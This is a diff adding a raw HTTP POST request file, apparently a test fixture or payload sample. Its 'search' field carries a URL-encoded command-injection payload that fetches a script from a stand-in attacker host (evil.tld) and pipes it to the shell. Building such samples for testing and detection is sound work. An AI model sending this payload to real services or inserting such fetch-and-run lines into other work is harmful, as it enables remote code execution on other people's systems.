@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 47
+Connection: close
+
+search=curl+http%3A%2F%2Fevil.tld%2Fi.sh+%7C+sh
